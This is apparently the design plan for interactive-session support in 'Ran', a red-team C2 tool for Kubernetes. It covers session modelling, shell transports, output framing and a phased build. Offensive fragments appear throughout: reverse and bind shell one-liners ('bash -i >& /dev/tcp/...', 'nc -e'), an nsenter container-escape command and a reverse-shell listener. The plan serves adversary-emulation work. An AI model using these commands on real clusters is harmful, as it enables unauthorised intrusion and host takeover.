# Interactive Sessions - Design & Implementation Plan

## Context

Ran today executes every TTP as a fresh, stateless invocation: the builtin C2
`kubectl-exec`s into a pod, runs one command, reads stdout/stderr, and tears
down. This works for atomic reconnaissance and most lateral movement, but it
breaks down for three cases:

1. **Reverse/bind shells.** Many realistic exploitation paths drop a shell on
   the target (`bash -i >& /dev/tcp/...`, `nc -e`, statically-linked implants).
   These are long-lived TCP connections; commands must be pushed and responses
   framed by Ran.
2. **Interactive K8s exec (`kubectl exec -ti`).** A sustained SPDY stream into
   a pod with stdin+TTY attached. Useful when the target shell maintains state
   (env vars, cwd, export of functions, sourced profile).
3. **Container escape in-flight.** An interactive shell running inside a pod
   that executes `nsenter -t 1 -m -u -i -n -p -- bash` is *the same socket*
   speaking to a different kernel namespace. From Ran's perspective the session
   kept its identity but its **exit point** moved from the pod to the host
   node.

The existing `ContainerEscape` relation (committed in `803df95`) handles case 3
only via **envelope wrapping** - every command through the escape edge is
prefixed with `nsenter … -- ${CMD}`. That works because each command is its
own stateless exec. It cannot work for a live shell, because the shell already
ran `nsenter` once and is sitting inside the host namespace waiting for stdin.

This document captures the conceptual framing for interactive sessions, the
domain model, and a phased implementation plan.

---

## Core insights

### 1. A session is a transport, not a target

The existing code conflates "who executes" with "where we're executing." The
builtin C2 *is* the execution transport, and its target is always a pod named
in the `ExecTtp`. An interactive session breaks that coupling: the session
carries the bytes, and the bytes may surface in whichever kernel namespace the
shell currently inhabits.

A session has:
- **Identity** - a stable `session/<uuid>` that persists across transitions.
- **Transport** - the concrete pipe (TCP socket, SPDY stream, implant RPC).
- **Exit point** - the entity the bytes end up executing on *right now*.

Identity and transport are stable for the session's lifetime. Exit point is
mutable and can move as a result of in-session actions (escape, `ssh host`,
`crictl exec`, etc.).

### 2. The escape doesn't create a new session - it promotes one

`nsenter` inside a live shell is not an event Ran mediates; it's an event Ran
*observes*. The ShellSession transport is unchanged. What changed is which
system entity the next command will execute on. That's a graph update, not a
backend swap.

### 3. Two execution primitives, one interface

Stateless exec (`kubectl exec -- cmd`) and stateful exec (send bytes to a
live shell) both answer the same question: *"given a backend and a command,
return the stdout/stderr/exit_code of running the command."* The stateless
path tears down after each call; the stateful path keeps the pipe open. From
the `C2Manager`'s view, both are `C2Backend` implementations.

The stateful impl carries the complexity that the stateless impl avoids:
- Output framing (no natural EOF per-command on a raw socket).
- Prompt/banner discard on session open.
- Exit-code extraction (no K8s `status` channel).
- Keepalives and liveness detection.

### 4. Session mobility must leave a graph trail

When a session on `pod/attacker` escapes to `node/worker-1`, two things must
remain queryable after the fact:
- Which session is currently *on* `node/worker-1`? (routing future commands)
- Which session *came from* `pod/attacker`? (attack-path attribution)

The first is a live operational fact. The second is a historical attack
fact. Both matter.

---

## Domain model

### New entity: `Session`

```rust
// crates/domain/entities.rs or new crates/domain/session.rs
pub struct Session {
    pub id: EntityId,                 // "session/<uuid>"
    pub kind: SessionKind,
    pub tty: bool,
    pub opened_at_ms: u64,
    pub status: SessionStatus,        // Connecting | Active | Idle | Closed | Lost
    // Exit point tracked via the ExitsInto relation below, not stored inline.
}

pub enum SessionKind {
    ReverseShell { listen_addr: String },  // Ran listens, target dials in
    BindShell   { remote_addr: String },   // Ran dials target
    KubectlExec { namespace: String, pod: String, container: Option<String> },
    Implant     { kind: String, uri: String }, // e.g. Sliver, Metasploit
}
```

### New relation: `ExitsInto`

```rust
// crates/domain/relations.rs
pub struct ExitsInto {
    pub session_id: EntityId,   // session/<uuid>
    pub entity_id:  EntityId,   // pod/<...> | node/<name> | future: container/<...>
}
impl C2Channel for ExitsInto {}   // is_exec_channel = true, weight 0.5
```

**Semantics.** At most one `ExitsInto` edge per session at any time (enforced
by the campaign, not the graph - mutating the edge is a single transactional
operation: remove old, insert new).

Why a relation and not a field on `Session`? Because:
- `resolve_exec_channel(entity)` can walk incoming exec-channel edges
  uniformly and find both envelope escapes and live sessions in one pass.
- Graph queries like "which systems have active sessions?" become a trivial
  edge scan.
- Future: multi-tenant sessions (e.g. a shell that forks into two namespaces
  via `setns` in separate processes) can be modelled by allowing multiple
  `ExitsInto` edges - not needed now, but the shape is right.

### Revised `ContainerEscape`

`ContainerEscape` keeps its Phase 1 behavior (envelope-only). It represents
the *capability* edge - "this pod can escape to this node" - and remains
useful for graph queries and envelope-based routing. It is **not** the place
to store live-session state. Live sessions are modelled separately via
`Session` + `ExitsInto`, and the escape event transforms the latter.

### AccessLevel rules

When a `Session` becomes Active with `ExitsInto(sess, entity)`, the campaign
upgrades `entity.system.access_level` to `Exec` (current behavior). When the
session's exit point moves, the new entity is upgraded; the previous entity
is **not** downgraded (the pod is still compromised; we just aren't sitting
on its stdin anymore).

---

## Transport abstraction

```rust
// crates/c2/src/session/transport.rs
#[async_trait]
pub trait SessionTransport: Send + Sync {
    /// Send stdin for a single logical command and read framed output.
    /// Implementations are responsible for injecting sentinels and parsing.
    async fn run(&self, cmd: &str) -> Result<CommandOutput, SessionError>;

    /// Probe liveness without running a command. Default impl: run `true`.
    async fn heartbeat(&self) -> Result<(), SessionError> { ... }

    /// Close the session and release resources.
    async fn close(&self) -> Result<(), SessionError>;
}

pub struct CommandOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}
```

### Concrete transports

| Transport | Crate location | Notes |
|---|---|---|
| `TcpShellTransport` | `crates/c2/src/session/tcp_shell.rs` | Raw TCP. Framing via `echo __RAN_END_<uuid>__:$?` sentinel. Used for reverse + bind shells. |
| `KubectlExecTransport` | `crates/c2/src/session/kubectl_exec.rs` | Long-lived `Api::exec` with `stdin(true).tty(true)`. Same sentinel-based framing. |
| `ImplantTransport` | future | Sliver/Mythic/etc. RPC. Exit code is native, no framing. |

### Framing for stream-based transports (TCP, kubectl-exec)

Commands run by the C2 are intended to be deterministic and machine-parsed.
A raw shell stream has no built-in boundaries. Protocol:

1. Generate a per-command nonce: `N = uuid()`.
2. Write to stdin:
   `{cmd} 2> >(sed "s/^/__STDERR__ /"); printf '__RAN_END_%s__:%d\n' "{N}" $?\n`
3. Read stdout until a line matching `__RAN_END_{N}__:(\d+)` appears.
4. Lines prefixed with `__STDERR__ ` are stripped and routed to stderr;
   remainder is stdout.
5. Exit code is captured from the sentinel.

**Caveats.**
- Prompt banners must be drained on session open before the first command.
  Send `stty -echo; unset PROMPT_COMMAND; PS1=''` early.
- TTY sessions may CR/LF-translate; `stty raw -echo` mitigates.
- `sed` isn't universal on minimal containers (`busybox sh` is fine, but
  truly hostile shells need a fallback - tee the whole stream as stdout
  and best-effort parse).
- Commands containing the sentinel are not supported. Make the nonce long
  and random.

### Kubectl exec specifics

`kube::api::AttachParams::default().stdin(true).stdout(true).stderr(true).tty(true)`
yields an `AttachedProcess`. `.stdin()` returns a writer; `.stdout()` a reader.
Keep the `AttachedProcess` alive in the transport struct; drop it to close.

The first command should be `exec bash --noprofile --norc` (or `sh`) to get a
predictable shell, then framing begins.

---

## Session lifecycle

```
     open                  run                  escape               close
 ┌─────────┐  ┌─────────┐  ┌─────────┐        ┌──────────────┐   ┌────────┐
 │ Create  │─▶│ Connect │─▶│ Active  │◀─────▶│ Active (new  │─▶│ Closed │
 └─────────┘  └─────────┘  └─────────┘        │  exit_point) │   └────────┘
                  │             │              └──────────────┘
                  ▼             ▼ lost conn
               Failed        Lost (auto-cleanup)
```

Transitions of interest:
- **Create → Connect**: For `ReverseShell`, registry allocates a listener and
  returns the session in `Connecting` state. For `BindShell`/`KubectlExec`,
  the registry dials/opens synchronously.
- **Active ↔ Active (moved)**: an effect like `session.exit_point(new_entity)`
  mutates the `ExitsInto` edge. Emits `SessionExitPointChanged` event.
- **Active → Lost**: `heartbeat()` fails N times. Registry transitions the
  session and removes the `ExitsInto` edge so routing stops picking it.

---

## Session registry

```rust
// crates/c2/src/session/registry.rs
pub struct SessionRegistry {
    inner: Arc<RwLock<Inner>>,
}
struct Inner {
    sessions: HashMap<SessionId, Arc<SessionState>>,
    by_exit: HashMap<EntityId, SessionId>, // one live session per exit point (latest wins)
}

pub struct SessionState {
    meta: SessionMeta,                  // kind, tty, timestamps, status
    transport: Arc<dyn SessionTransport>,
}
```

The registry is shared by `C2Manager` (to dispatch) and the campaign
effect-handler layer (to mutate exit points). It is a new module inside
`crates/c2`.

### C2Manager integration

`C2Manager::backends` becomes a unified map keyed by backend id. A
`SessionBackend` newtype wraps an `Arc<SessionState>` and implements
`C2Backend`:

```rust
impl C2Backend for SessionBackend {
    async fn execute(&self, cmd: &ExecTtp) -> TtpExecuted {
        let out = self.0.transport.run(&cmd.procedure.command).await;
        to_ttp_executed(cmd.id.clone(), out)
    }
}
```

Session ids used as `exec_system_id` route through this path. The existing
`select_backend` logic (exact match on `exec_system_id`, fall back to
builtin) needs no change.

`C2Manager` gains one new method:
```rust
pub fn register_backend(&self, id: String, backend: Arc<dyn C2Backend>);
```
exposed through `C2Handle` via a second mpsc control channel (the session
registry lives inside `C2Manager` so registration is a message, keeping the
existing single-ownership model intact).

---

## Exit-point mobility - the escape transition

The attacker workflow in Ran today:
1. Compromise pod A (get an exec channel to it).
2. Run the `container.escape` TTP on pod A.
3. Future commands against `node/N` are routed through pod A with
   nsenter-wrapping (envelope mode).

The workflow for interactive sessions:
1. Open a reverse shell on pod A → `Session s, ExitsInto(s, pod/A)`.
2. In the shell, run the `container.escape` TTP. The procedure command (e.g.
   `nsenter -t 1 -m -u -i -n -p -- bash --noprofile --norc`) is sent *into
   the session*. The old bash is replaced by the new one in the host
   namespace. Session `s` is still alive; its bytes now land on the node.
3. Effect handler detects the escape outcome and emits `session.exit_point(
   session=s, entity=node/N)`. The campaign drops `ExitsInto(s, pod/A)` and
   inserts `ExitsInto(s, node/N)`.
4. Also insert a `ContainerEscape(pod/A, node/N)` edge for attack-graph
   attribution (but **without** an envelope - this edge is historical, not
   routing).

### Where the decision is made

The effect parser for the escape TTP must know whether the current exec
used a live session or a stateless exec. Two paths:

- **Live session path** (`exec_system_id` is a `session/*` id):
  - Emit `session.exit_point(sys, target_node)` effect.
  - Emit `ContainerEscape(pod, node)` (envelope=None, for attribution).
- **Stateless path** (`exec_system_id` is `c2/ran`):
  - Emit `ContainerEscape(pod, node, envelope=PROCEDURE_CMD)` (Phase 1
    behavior, unchanged).

This branching lives in the `container.escape` effect parser. It has access
to `exec_system_id` via `ctx`.

### `resolve_exec_channel` changes

Current logic: finds a graph path of exec-channel edges from a foothold to
the target, returns the hop list. Live-session extension:

```
1. If target has an incoming ExitsInto edge → return ExecChannel::direct(session_id)
   with no hops. (Fast path; skips graph traversal.)
2. Otherwise, existing logic: shortest exec-path over ContainerEscape /
   RceCanExec / PodExec etc., wrapped through the builtin C2.
```

---

## Integration touchpoints

| File | Change |
|---|---|
| `crates/domain/entities.rs` (or new `session.rs`) | `Session` entity + `SessionKind` + `SessionStatus` |
| `crates/domain/relations.rs` | `ExitsInto` relation; `C2Channel` impl; weight in `edge.rs` |
| `crates/domain/mod.rs` | Re-exports |
| `crates/graph/src/edge.rs` | `"session.exits_into" => (0.5, true)` |
| `crates/c2/src/lib.rs` | Make `C2Backend` pub; export session types |
| `crates/c2/src/executor.rs` | Add `register_backend` control path; no other change |
| `crates/c2/src/session/mod.rs` | New: module root |
| `crates/c2/src/session/registry.rs` | New: `SessionRegistry` |
| `crates/c2/src/session/transport.rs` | New: `SessionTransport` trait, framing helpers |
| `crates/c2/src/session/tcp_shell.rs` | New: `TcpShellTransport` (reverse + bind) |
| `crates/c2/src/session/kubectl_exec.rs` | New: `KubectlExecTransport` |
| `crates/campaign/src/effects.rs` | New effects: `session.open`, `session.exit_point`, `session.close`; update `container.escape` parser to branch on live-session path |
| `crates/campaign/src/campaign/state.rs` | `resolve_exec_channel`: check `ExitsInto` edges first |
| `crates/app/src/lib.rs` | Wire `SessionRegistry` into `AppState`; expose over HTTP + SSE |
| `frontend/src/lib/...` | Session panel (list, open, close, switch active); out of scope for the initial backend phases |

---

## Phased implementation plan

### Phase A - Domain & routing skeleton (no transports yet)

Make the domain represent sessions and their mobility. No networking code.

1. Add `Session` entity, `SessionKind`, `SessionStatus` to domain.
2. Add `ExitsInto` relation, graph weight, `C2Channel` impl.
3. Add `session.open`, `session.exit_point`, `session.close` effect parsers
   that create/mutate the entity and edge (no real shell behind any of it -
   purely a model test).
4. Update `resolve_exec_channel` to short-circuit on `ExitsInto` edges.
5. Unit tests in `effects.rs` and `state.rs`:
   - opening a session on a pod makes future routing to that pod return the
     session's backend id with no hops;
   - `session.exit_point` moves routing to a node;
   - closing the session restores the default envelope/kubectl-exec path.

**Deliverable:** a purely in-memory session model with no networking; tests
prove the routing transitions work.

### Phase B - C2 registration plumbing

Enable runtime backend registration so a session can actually dispatch
commands through `C2Manager`.

1. Make `C2Backend` trait `pub` in `crates/c2/src/lib.rs`.
2. Add a control channel to `C2Manager` and a `register_backend` method on
   `C2Handle`.
3. Add a `MockSessionBackend` (echoes its input, returns a scripted exit
   code) and an integration test: register it, send an `ExecTtp` with its id
   as `exec_system_id`, verify the event.

**Deliverable:** registration works end-to-end with a mock; no real I/O yet.

### Phase C - Kubectl exec session

Do `kubectl exec -ti` first because it reuses the existing `K8sService` and
avoids TCP listener concerns (NAT, firewall, etc.).

1. `KubectlExecTransport`: long-lived `AttachedProcess` with stdin+tty.
2. Framing: sentinel-based, with shell init (`stty -echo`, unset prompt).
3. Open a session from the UI; verify a `ls /` through the session lands
   as a `TtpExecuted` event with correct stdout/stderr/exit_code.
4. Container-escape TTP run through a kubectl-exec session: session's
   `ExitsInto` moves from pod to node, subsequent `id` command returns
   `uid=0(root)` from the host.

**Deliverable:** the full escape-in-session flow works over kubectl-exec.
Most of the hard framing problems get shaken out here in a controlled
transport.

### Phase D - TCP reverse/bind shells

1. `TcpShellTransport` with the same framing protocol.
2. A `Listener` resource (ran-side) that accepts reverse connections and
   registers a session automatically on connect.
3. Minimal UI: list listeners, list active sessions.
4. Integration test against a netcat shell in a sidecar.

**Deliverable:** reverse-shell TTPs can hand off to a live session.

### Phase E - Hardening

- Keepalives + liveness detection; auto-cleanup of `Lost` sessions.
- Session timeouts, idle eviction.
- TTY resize messages (SIGWINCH) for kubectl-exec.
- SSE events for session state changes → UI.
- Audit trail entries for every exit-point change.
- Concurrent-command serialization per session (one in-flight at a time).

---

## Open questions

1. **Command serialization per session.** If two TTPs target the same
   session concurrently, do we queue, reject, or multiplex? Initial
   recommendation: serialize with a per-session `Mutex`; reject if lock
   contention exceeds a small timeout.
2. **Session ownership across operators.** When multi-user support lands,
   who "owns" a session and who can hijack? Out of scope for now.
3. **Persistence.** Sessions are in-memory only. A Ran restart drops them.
   Accept this for now; a reverse shell that outlives Ran is a recovery
   problem we defer.
4. **Shell heterogeneity.** Minimal containers (distroless, scratch+busybox)
   may lack `bash`, `sed`, or process substitution. The TCP transport needs
   a feature-probe on open and a fallback framing that tolerates `sh` only.
5. **Attack-graph attribution after escape.** Do we want a separate
   `SpawnedFrom(session_new, session_old)` edge, or is `ExitsInto` history
   in execution records sufficient? Probably the latter - sessions aren't
   spawned from each other; they're mutated.
6. **`kubectl exec -ti` vs. a true reverse shell for escape.** Both work,
   but kubectl-exec is bound to the K8s API's reach. A reverse shell
   survives loss of API credentials. Operationally these are different
   tools; both should be supported and we should not try to unify them
   beyond the `SessionTransport` trait.

---

## Relationship to `docs/container_escape_plan.md`

This plan **supersedes Phase 2** of the container escape plan. Phase 1 of
that plan (envelope-based `ContainerEscape`) stays as-is; Phase 2 of that
plan is rewritten here with the session abstraction as the primary model
instead of a `backend_id` field grafted onto `ContainerEscape`.
